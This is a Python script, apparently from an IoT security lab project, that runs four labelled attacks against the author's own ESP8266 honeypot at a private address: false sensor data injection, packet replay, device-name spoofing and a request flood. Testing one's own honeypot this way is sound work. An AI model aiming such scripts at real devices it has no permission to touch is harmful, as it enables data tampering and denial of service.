import requests, time, random

# Month 2 — TARGET is ESP8266 honeypot IP
# Change this to your ESP8266's IP from Serial Monitor
TARGET = "http://172.20.10.2/data"   # <-- update this

def false_data():
    print("\n[ATTACK 2] FALSE DATA INJECTION → honeypot")
    for v in [-99, -1, 9999, 5000, 0.0001, 450]:
        try:
            r = requests.post(TARGET,
                json={"device":"esp32","distance":v}, timeout=5)
            print(f"  Injected {v} cm → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.5)

def replay():
    print("\n[ATTACK 3] REPLAY ATTACK → honeypot")
    pkt = {"device":"esp32","distance":24.5}
    for i in range(20):
        try:
            r = requests.post(TARGET, json=pkt, timeout=5)
            print(f"  Replay {i+1} → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.2)

def spoof():
    print("\n[ATTACK 4] SPOOFING → honeypot")
    for dev in ["esp32_trusted","admin_sensor","sensor_01"]:
        for _ in range(5):
            try:
                r = requests.post(TARGET,
                    json={"device":dev,
                          "distance":round(random.uniform(5,30),1)},
                    timeout=5)
                print(f"  Spoof as '{dev}' → {r.status_code}")
            except Exception as e:
                print(f"  Failed: {e}")
            time.sleep(0.3)

def flood():
    print("\n[ATTACK 1] FLOOD → honeypot")
    for i in range(100):
        try:
            r = requests.post(TARGET,
                json={"device":"esp32",
                      "distance":round(random.uniform(10,50),1)},
                timeout=5)
            print(f"  Flood {i+1} → {r.status_code}")
        except Exception as e:
            print(f"  Failed: {e}")
        time.sleep(0.05)

if __name__ == "__main__":
    print(f"Attacking honeypot at: {TARGET}")
    false_data(); time.sleep(2)
    replay();     time.sleep(2)
    spoof();      time.sleep(2)
    flood()
    print("\nAll 4 attacks complete.")